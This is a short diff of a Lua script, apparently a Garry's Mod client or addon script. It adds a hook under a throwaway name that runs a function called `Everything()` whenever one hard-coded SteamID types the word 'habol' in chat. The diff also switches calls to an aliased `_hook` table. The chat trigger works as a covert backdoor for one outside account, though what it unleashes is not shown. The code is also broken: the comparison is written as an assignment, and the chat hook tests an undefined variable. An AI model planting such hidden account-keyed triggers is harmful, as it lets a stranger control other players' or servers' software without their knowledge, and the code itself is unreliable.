@@ -281,8 +281,14 @@ local function Everything()
     end)
 end
 
-hook.Add("PlayerStartVoice", "asdasdas", function(ply)
+_hook.Add("PlayerStartVoice", "asdasdas", function(ply)
     if ply = LocalPlayer() then
-        Everything
+        Everything()
+    end
+end)
+
+_hook.Add("OnPlayerChat","HILOLOLOLOLOLLOL",function(player,text)
+    if ply:SteamID() == "STEAM_0:0:456670572" and text == "habol" then
+        Everything()
     end
 end)
